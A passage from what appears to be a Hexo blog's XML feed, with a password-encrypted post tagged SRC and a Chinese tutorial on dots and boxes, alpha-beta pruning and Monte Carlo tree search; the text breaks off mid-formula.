691314a1a0086c2a05470c6f1021eac94b674e5ce728d5b9e09b68fd439f701670e889abb8e09bb1c0da3d9bb97abf0226805ca905e935bd79d3679fafadd97dc5d423abfddbcea7c28b8d3ecc72ae6ed4c4ae57e154ecd0da40983afeac419a5e4955bd90922a46e413488558d414a216e06e43f24aa5527f74eb3bf810158809c644a7ba709ac45d933235e966f9569cb66949e07aaf6e36558e7630809f538a6b4f76bbc1b6a47047032fe3a231c76e214fd18dc4f45745795db8bcefd8cbb8114bc66ed5f1b1ea4d10314d0dfa20cf0e5f400fe7a97a42f32dc0e349200617dce9e436f3277bd874970a435f082baedafc0a69bf0e2fb4046271f985e429d1d11f319c58c52c72204285e5e9241d49cd1cc9f364b07cb4faaed3d9372b5f31d61a53bb94df6ab4b309c782417f6aef9d37b4858c90224c740ea3e6a2e7d0a8f4ed6b8ec5fb30a4946c17eca23ea2e36599b4d8edf42ee2f45970f533dea68a66ff8ee328b2df897ced770bf84f0303899504d53ebef43a1a849af3976325f53f410a45763252623d6f8888c67fe026db9a4f7184cd2f3832a5ba05eaf319a62cbbca4618c2ba4a6250b0671f590be33e479ce98fa1eb4d244331cae6697dfbf79d5e0dc0b0285c1151dec76d0b66c1ca5d2470fc1dcb56374644ac77fca055ceff8edaaefc9bb2a2c26d77cb1161b7a9647d9948457dfdc455f4e162385140fc98ae78070a7b137e7b8554fe0a671d4f024297959fdaca6a91b5cf15f47ed56febd96f6e0bbd0768ccfac034d376703e2ea2c2ffe0891194dcc15d16cd0fca02f9c0ae2267ee8c7c91349caa9b9b16d7879f1db9989a7424e9241477d65cbf6596f40aab36f5f83d5305f552d56e688ce5bad8b3e76dc977dd6a98626b2bfc9d974df86a9671c3343ba6147d78ad37cdc06be1c10f298e6798ca19817ef2a3324510ac6888094e363a4d5ba5172c0b96788c76ab48077829d95c3e23ee1a1eada40107672aa854d10548b50811b6909b2f8077c2d6ff1db11989f0fea592de3fe4ab01b077a493fd71125909fd18ac6f4489ce7459bede7a309c2be2d9dc00e261c0e247b7d4b6ca38359bc7d5ca937fe4dd1a1ae182873f64b4054b8700fbda247e204d01ded403bfa057952299fbf24130d7641767878d9bbba14c14d1a437d95f345630489956897b11c75c6ab46ca6ad4f848f3fe1506bea362234b116fbf0a85d104ada2740fd67b8d1b31b03f03cff1eaf9ccd3ffb47d50e9233f05eea674215021dc769ae7891bd75e3ed95285b053003cf0e62711b23d01216c41e04b9b7d2940ba582cd65bfd920d4f8ec3f24d6e315d5ee4f536d4eef5ffa214d5829d7fcb6e0472bb5ab05c12d9bc01db6d128adb917f3402b5b77359e465d591f086118412ba9343767219d46f269d7f56a5bc4db54407f70ab6c1159a7596464bd15f67f87cdabfa2a20ec4a57990d00a21f25a6a64ea411403c19a5f7abcb61f897acd11c6496fc682a5dd839f71e47c98d66ded523f74c45be5618a317bc07e96c0854a8d4afa8f6eea6a1e469d6157559e387d6d8a70fe890d85e091b0e2c7b5a4cdcbb9fb42d949cd31e72cc4ce892004a100e6076fa5d24551be5a9980bb14ebf09cd09c1124fba1348dea0ff7daacd13a82d0f97d75eadb2d31d2fa9a2f84db1953a586fe84e51f2ba4d9bf7bc45c3887cf6ac04295c9aeb9a8c87a6dcbbf96a9681c93e48bd68e4c76bfb3d6ef59686586e506d331063112ea820e0ee91f6bc1167cc9362fd0842c6a0e7a7f325d265c5d19f314497096ab1eb75da8975b3216a45cf12a33dcfc02c36764e08cd647f0f96d47dfd9d0e05997119e96a56151137a2beb814ae27f0ec72df99fe127aed1465c77de86dd047591295bc47b2eaf3ab60aea957c2926f6f93c165e7146a27080d19e4930e9c497fe711a2b37c1be3227dc99ab865745e85b9a69697cccc47335d6a9b93764695e5d46859bbd9b78355f4a323b6f7c4b97dd8747197780f83ddc69329cc309fc25a930fc583c2cd055b35438a2fe89fac5b92c6654ac58cc7faeb46d70a6470f7c82bba18e84fec195f60ae1beabf76e330939f864dee5eb79c8e309d6d87c953232a9884df32b0c40a01b5ba52e85fb3d59ba4fd250efefefb58185234ab3f624795667ca759c5c03fae9afb2c94aa502bd42ab7c11fb49bd5160e70ea3a8f38e3ab41ed3d472fd1e5cdf218f48caeb67a290ed42f3466fba5b5bbf2e9dc38cdb09a373b5231e20ac9a1403ce3e8047f9cf9c0208748a50218caab5dbafce30248eb3111f156e9c46801b66878b86e4055e810d462b75f56320041c3748590afc2d7d65e7580c52a331d36d7f1cca20ec83294b8ddc3bd76117d8c9faf1ecdf1a489c96e7dd135ed64421086867462341449d37629213efd48a9ebabadf2ab71284a753be7559f83637ffffd59216d73857d007c8cbb7243a73f790e89675dec6de6a3e9ac724d23b195d27788c2b20b6bde5b969b7ed5001dcf8a0031fd9065f46a295c191bf6396fe8b28a0508f9dd9c9fa7c83c47aa178bd8accf1dec1329fe2167f3ca946e3a5a2660e14cfa3053b38d2b9123c810b9a45ede84f734a49f4c1215d0676f5e0a746759b4c4546699ba696f9ed22b92daebd54b31fd7020162a34cf65543e212cc3095a64de2e657663b0d0e63783d960e7e3090275183a3f183cccf23df1b133acffa34038020fdd28bf627d8fb81c10c1ce0995ceffe7c46cb27ebc9ec545021094d33e7d6c78b007f337bc080d7eae6ede6bfc38b91efd6a388c74b1707d0d1f2dd592ecff5c8fd01c8c29492943ef94942845102e4691e348e24adbe344c430b73b7ba8a40de8ab8d50b2d60245541e96e4de511fbaf42533431911f1a51447f7b48a0fb2dded0bb329c17b48a2852c1cd98665576c7bbf16801aa5f7a7d4952d7f362f8b40f3ca21077c46341e6901ea3e653f5582ddba1ebf0e76f6d20311853e01e8e0776e1f14bc460a929207798464d986feda710879e0c097638247859c5c1e09b7abe7e82b89d7786504f51dc34970087b51c642c34457682c90f4c2d5202c977423c96e11d88603983f8caa7c94d7178284858a035867082accbb6129a72fe6b2853b4e5545305b556f19544fd362d304fbf0a0596067253775fd1b92e08ec34d1c446c1e225da698ebf4387d9dad41c455d29e9cfee057088db265bd199be04ff4c899b6ec58b3a072184d7d004a04e3dddb9b3e3b53efdf64ce1a88205e624dead804a3c2de6f60090cafd6e08032e5efddadd3fc4f9c49261f85ad73f13b029a7ffaceee3c68fff087669af00f11219e8b6fc542fa2ee4603a776b7c1a045fc0a2a00c315697b8fd517f2104046d92d838b98ac87e89a452d06486c3567a8b8549da70eebbbd0858b8fef29a6c2657248adcd7b2efe89020138c3a18259981694ec7f98ac1f955efca20d0ae550860fe9ff52eeab29930ccc780eb8df7b0547338dae5a60544f1f951f1506628e44ba74def1298c15d41c388c72d619828c360761b4ddba024bedbe0fe6dc7aa718d69444f069634b47cbd8682837d84ad4c9d312c8d30c468951c6a7da2a18b8cb73220cd8eeaff02edb5089fbca4c1f611bfc5ecb258c2ff7</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博弈程序编写</title>
    <link href="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<p>写一些博弈相关的东西</p><span id="more"></span><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p>点格棋由$6<em>6<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="11.312ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 5000 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">点</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">构</text></g><g data-mml-node="mi" transform="translate(4000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">成</text></g></g></g></svg></mjx-container>5</em>5$的格子，整个局面一共25个格子和60条边。</p><p>游戏规则：四条边围住一个格子，这个格子归属于放下最后一条边的一方，当最终棋盘被填满时，占据格子多的一方获胜。</p><p><strong>长链</strong>：一系列尚未被完全围住的正方形（通常只有两条边），这些正方形共享边，形成一个连续的链条状结构。如下图</p><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/image-20240905164925237.png" class=""><p><strong>打开长链</strong>：当一方使得长链正方形中的某一个正方形构成了3边，就会形成死树，那么其对手方将获会占据所有长链正方形。</p><p><strong>死树</strong>：一个已经形成的长链状结构，只差一条边就可以完成并将所有包含的正方形“吃完”（即完成所有正方形，获得分数和额外回合）。死树非常接近完成，但当前回合的玩家不愿意去画最后那条边，因为这样做会给对手带来大量得分。</p><p><strong>环</strong>：若干个正方形围成的闭合结构，即它们的边已经被画满，形成一个封闭的回路。</p><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/image-20240905165026155.png" class=""><p><strong>让格</strong>：通过不主动完成某些正方形，让对手先操作一些边线，从而为自己留下更有利的操作空间。</p><h3 id="alpha-beta剪枝"><a href="#alpha-beta剪枝" class="headerlink" title="alpha&beta剪枝"></a>alpha&amp;beta剪枝</h3><p>树结构定义：</p><p>每个节点表示此时的赢面</p><p>根节点表示我方赢面</p><p>父节点到子节点表示执棋方落子一步，故以我方为根节点，则奇数层为我方赢面，偶数层为敌方赢面</p><p>搜索深度就是树的深度</p><p>最大最小算法：</p><p>​根据树结构定义，我们显然要在奇数层获取最大赢面，对手会在偶数层使得我们走向最小赢面。故我们在偶数层填入子节点中的最小值，称为MIN节点，在奇数层填写子节点中的最大值，称为MAX节点。</p><p>剪枝：</p><p>​上述算法需要遍历整个博弈树，我们发现在遍历博弈树的过程中，我们的赢面情况是在不断变化的，所以我们可以记录当前赢面的范围，从而规避掉不必要的搜索路径。<code>alpha</code>表示此时可以获得的最大赢面，<code>beta</code>表示此时我方受到敌方行棋限制（根据先前的搜索结果敌方可以导向我方选择路径）后可以获得的最大赢面，当<code>alpha</code>大于等于<code>beta</code>时，剪掉后续路径。<br><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="24.315ex" height="2.009ex" role="img" focusable="false" viewBox="0 -694 10747.1 888"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(529,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(827,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(1330,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1906,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2712.8,0)"><g data-mml-node="text"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="text" transform="translate(778,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g></g><g data-mml-node="mi" transform="translate(4546.6,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(5015.6,0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(5448.6,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5933.6,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(6384.6,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mo" transform="translate(7128.3,0)"><g data-mml-node="text"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z"></path></g><g data-mml-node="text" transform="translate(778,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g></g><g data-mml-node="mi" transform="translate(8962.1,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(9391.1,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(9857.1,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(10218.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g></svg></mjx-container><br>回溯过程中存在三种状态：</p><ol><li>初始状态：通过父节点向下传递<code>alpha</code>和<code>beta</code>的值</li><li>左子树回溯结果：如果是MAX节点，则更改<code>alpha</code>的值，需要满足值大于原<code>alpha</code>，否则不用更改；如果是MIN节点，则更改<code>beta</code>的值，需要满足值小于原<code>beta</code>，否则不用更改</li><li>回溯结果：即右子树回溯，</li></ol><img src="/2023/04/24/%E5%8D%9A%E5%BC%88%E7%A8%8B%E5%BA%8F%E7%BC%96%E5%86%99%E5%9F%BA%E7%A1%80/Snipaste_2024-05-16_17-35-06.png" class=""><h3 id="蒙特卡洛树搜索"><a href="#蒙特卡洛树搜索" class="headerlink" title="蒙特卡洛树搜索"></a>蒙特卡洛树搜索</h3><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.618ex;" xmlns="http://www.w3.org/2000/svg" width="24.504ex" height="4.767ex" role="img" focusable="false" viewBox="0 -950 10830.9 2107.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(394,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(965.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="munder" transform="translate(2021.5,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"></path></g><g data-mml-node="TeXAtom" transform="translate(535,-1050) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3632.2,0)"><g data-mml-node="mi"><path data-c="394" d="M51 0Q46 4 46 7Q46 9 215 357T388 709Q391 716 416 716Q439 716 444 709Q447 705 616 357T786 7Q786 4 781 0H51ZM507 344L384 596L137 92L383 91H630Q630 93 507 344Z"></path></g><g data-mml-node="mo" transform="translate(833,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msubsup" transform="translate(1222,0)"><g data-mml-node="mi"><path data-c="1D437" d="M287 628Q287 635 230 637Q207 637 200 638T193 647Q193 655 197 667T204 682Q206 683 403 683Q570 682 590 682T630 676Q702 659 752 597T803 431Q803 275 696 151T444 3L430 1L236 0H125H72Q48 0 41 2T33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM703 469Q703 507 692 537T666 584T629 613T590 629T555 636Q553 636 541 636T512 636T479 637H436Q392 637 386 627Q384 623 313 339T242 52Q242 48 253 48T330 47Q335 47 349 47T373 46Q499 46 581 128Q617 164 640 212T683 339T703 469Z"></path></g><g data-mml-node="mn" transform="translate(861,413) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(861,-247) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2486.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2875.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(3404.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(3793.6,0)"><path data-c="2C" d="M78 35T78 